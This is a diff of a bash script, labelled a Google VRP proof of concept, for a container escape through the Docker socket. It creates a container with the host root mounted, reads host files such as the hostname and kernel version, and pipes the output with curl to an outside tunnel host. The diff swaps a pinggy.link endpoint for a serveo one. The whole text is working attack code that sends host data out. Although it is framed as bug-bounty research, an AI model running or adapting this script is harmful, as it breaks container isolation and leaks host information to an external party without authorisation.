@@ -1,14 +1,13 @@
 #!/bin/bash
-# TARGET: gxxlv-103-95-173-113.a.free.pinggy.link:33897
-TARGET="gxxlv-103-95-173-113.a.free.pinggy.link"
-PORT="33897"
+# TARGET: 1cb5413e91fecf51-103-95-173-85.serveousercontent.com
+URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE VRP: HTTPS ONE-LINER PoC ==="
+  echo "=== [!] GOOGLE VRP: SERVEO HTTPS ESCAPE LIVE ==="
   echo "Timestamp: $(date)"
 
-  # 1. Reuse the exploit volume (host_root_exploit)
-  # Image: sha256:25109184c71bdad7
+  # 1. Create the exploit container via the Docker socket
+  # Using the persistent volume 'host_root_exploit'
   CONTAINER_JSON=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
     -H "Content-Type: application/json" \
     -d '{
@@ -22,15 +21,17 @@ PORT="33897"
     curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
     sleep 1
     
-    # 2. Exfiltrate Host OS Release & Hostname
-    echo "--- HOST IDENTITY ---"
+    # 2. PROOF OF CONCEPT: Read Sensitive Host Data
+    echo "--- [HOST IDENTITY] ---"
     curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/hostname" | tar -xO
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/os-release" | tar -xO
+    
+    echo "--- [HOST KERNEL VERSION] ---"
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/proc/version" | tar -xO
     
     # 3. Cleanup
     curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
   else
-    echo "Container creation failed."
+    echo "[!] Container creation failed. Ensure host_root_exploit exists."
   fi
 
-} | curl -k -X POST --data-binary @- "https://$TARGET:$PORT"
+} | curl -k -X POST --data-binary @- "https://$URL"
